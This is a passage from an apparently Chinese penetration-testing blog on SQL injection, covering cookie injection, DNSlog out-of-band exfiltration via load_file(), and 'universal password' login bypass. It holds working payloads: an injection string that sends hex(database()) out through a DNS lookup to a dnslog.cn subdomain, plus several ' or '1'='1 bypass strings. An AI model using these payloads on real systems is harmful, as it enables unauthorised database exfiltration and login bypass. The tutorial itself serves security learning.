title="Cookie注入"></a>Cookie注入</h3><p>COOKIE注入与 GET、POST 注入区别不大，只是传递的方式不一样。GET在 url 传 递参数、POST在POST 正文传递参数和值，COOKIE在 cookie 头传值；</p><blockquote><p> get 在 url 栏，即使提交的方法是 post 只要在 url 栏上都可以传递 get；</p><p> post 在正文里，提交的方法必须存在 post；</p><p> cookie 有没有post都可以；</p><p> http头注入就是在头部字段中进行注入  </p></blockquote><h3 id="DNSlog外带注入"><a href="#DNSlog外带注入" class="headerlink" title="DNSlog外带注入"></a>DNSlog外带注入</h3><p>DNS在解析的时候会留下日志，咱们就是读取多级域名的解析日志，来获取信息。简单来说就是把信息放在域</p><p>名中，传递到自己这DNS服务上，然后读取日志，获取信息；</p><p>在SLQ无回显时也可使用DNSlog外带注入，前提是load_file()函数未被禁用，且mysql的my.ini文件中<code>Sercure_file_prive</code>字段为空。</p><p><strong>load_file()：</strong></p><p><code>load_file(&quot;[路径]&quot;)</code>：用于读取某个文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(&quot;C:\\test.txt&quot;);</span><br></pre></td></tr></table></figure><p>除了可以读取本机路径以外还可以读取到网络上的路径，即可以使用URL路径。</p><p>常见DNSlog平台：</p><blockquote><p> 常见的第三方dnslog平台：</p><p> http:&#x2F;&#x2F;<a href="http://www.dnslog.cn/">www.dnslog.cn/</a></p><p> <a href="http://ceye.io/">http://ceye.io/</a></p><p> <a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p></blockquote><p>利用过程：</p><p><img src="./1757333409976.png" alt="1757333409976"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- -mysql命令行执行：</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select hex(database())),&#x27;</span>.example.dnslog.cn\\abc<span class="string">&#x27;))) </span></span><br></pre></td></tr></table></figure><p>其中<code>example.dnslog.cn</code>是在DNSlog平台获取的临时DNS，命令执行后会携带返回的数据出现在平台的DNSlog日志中。</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin </span><br><span class="line">password </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$pwd&#x27;</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> </span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">admin&quot; or &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> </span><br><span class="line">admin&quot;) or &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span>  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
